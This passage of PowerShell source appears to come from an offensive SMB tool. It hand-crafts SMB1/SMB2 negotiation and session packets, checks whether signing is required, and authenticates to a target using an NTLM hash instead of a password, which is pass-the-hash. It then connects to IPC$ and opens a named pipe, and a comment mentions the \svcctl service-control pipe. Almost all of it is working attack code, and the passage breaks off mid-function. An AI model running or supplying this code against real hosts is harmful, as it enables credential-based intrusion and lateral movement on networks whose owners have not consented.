                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {

                                        if($signing_check)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if($signing_check)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                    'NTLMSSPNegotiate'
                    {

                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }

        }

  

    if($login_successful)
    {


        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }



        if($SMB_version -eq 'SMB1')
        {
            $stage = 'TreeConnect'

            while ($stage -ne 'Exit')
            {
            
                switch ($stage)
                {

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'TreeDisconnect'
                    }


                    'CreateAndXRequest'
                    {
                        [System.Text.Encoding]::UTF8.GetBytes($PipeName) | ForEach-Object{$SMB_named_pipe_tobyte += "{0:X2}-00-" -f $_}
                        $SMB_named_pipe_tobyte = $SMB_named_pipe_tobyte.Substring(0,$SMB_named_pipe_tobyte.Length-1)
                        $SMB_named_pipe_bytes = $SMB_named_pipe_tobyte.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                        #$SMB_named_pipe_bytes = 0x74,0x00,0x65,0x00,0x73,0x00,0x74,0x00,0x70,0x00,0x69,0x00,0x70,0x00,0x65,0x00,0x73,0x00 # testpipes
                        # old code $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        Write-Verbose "CreateAndXRequest send"
                        $stage = 'TreeDisconnect'
                    }
                  

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }


                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = $stage_next
                    }
                
                
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'CreateAndXRequest'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Logoff'
                    }

                }
            
            }

        }  
        else
        {
            
            $stage = 'TreeConnect'

            try
            {

                while ($stage -ne 'Exit')
                {

                    switch ($stage)
                    {
                

                        'CloseRequest'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
        
                            $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                    
                        'CreateRequest'
                        {
                            $stage_current = $stage
                            [System.Text.Encoding]::UTF8.GetBytes($PipeName) | ForEach-Object{$SMB_named_pipe_tobyte += "{0:X2}-00-" -f $_}
                            $SMB_named_pipe_tobyte = $SMB_named_pipe_tobyte.Substring(0,$SMB_named_pipe_tobyte.Length-1)
                            $SMB_named_pipe_bytes = $SMB_named_pipe_tobyte.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            
                            #$SMB_named_pipe_bytes = $SMB_named_pipe_tobyte #0x74,0x00,0x65,0x00,0x73,0x00,0x74,0x00,0x70,0x00,0x69,0x00,0x70,0x00,0x65,0x00,0x73,0x00 # testpipes
                            # old code $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data  
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                                Write-Verbose "CreateRequest send!"
                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                    Write-Verbose "pending"
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }

                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }                    

                        }


                        'Logoff'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }


                        'ReadRequest'
                        {
                            Start-Sleep -m $Sleep
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID
                            $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
